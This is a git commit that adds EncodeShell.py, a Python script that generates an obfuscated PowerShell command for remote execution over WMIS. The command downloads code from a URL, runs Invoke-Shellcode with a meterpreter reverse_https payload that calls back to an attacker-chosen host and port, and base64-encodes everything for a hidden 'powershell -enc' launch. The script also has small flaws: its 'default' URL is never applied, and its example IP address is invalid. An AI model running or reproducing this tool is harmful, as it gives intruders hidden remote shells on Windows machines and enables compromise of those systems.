9b36840d193c798a309e099f3efb8330e93fa2de
Chris Campbell <obscuresec@gmail.com>
2013-07-19 21:56:58 -0400

    Create EncodeShell.py

---
+++ EncodeShell.py
@@ -0,0 +1,58 @@
+#!/usr/bin/python
+#
+# EncodeShell.py
+# Simple python script to output meterpreter commands for WMIS
+# by Chris Campbell (obscuresec)
+#
+import base64
+import sys
+
+def build(url,lhost,lport):
+    #build script syntax
+    script = "IEX (New-Object Net.WebClient).DownloadString('"
+    script += url
+    script += "'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost "
+    script += lhost
+    script += " -Lport "
+    script += lport
+    script += " -Force"
+    
+    #convert string to LE Unicode
+    unicode = script.encode('utf_16_le') 
+    
+	  #base64 encode the script portion
+    encoded = base64.b64encode(unicode)
+ 
+    #build the final command
+    cmd = "cmd.exe /c powershell.exe -nop -nol -enc "
+    cmd += encoded
+ 
+    #check length in case long url is provided 
+	  #http://support.microsoft.com/kb/830473
+    cmdlen = len(cmd)
+    if cmdlen > 8191:
+        print "The length of the command is to long to use! Limit is 8191"
+        print "Try using a URL shortener."
+    return cmd
+ 
+#grab args
+try:
+    lhost = sys.argv[1]
+    lport = sys.argv[2]
+    url = sys.argv[3]
+    
+	  ps = build(url,lhost,lport)
+    
+	  print "The command is:"
+	  print ""
+	  print ""
+	  print ps
+ 
+	  if url == 'default':
+	      url = 'http://bit.ly/14bZZ0c'	
+  
+#index error
+except IndexError:
+    print "python EncodeShell.py lhost lport url"
+  	print "ex: python EncodeShell.py '192.268.4.5' '443' 'default'"
+	  print "ex: python EncodeShell.py '192.268.4.5' '443' 'http://192.168.4.5/powersploit/invoke-shellcode/'"
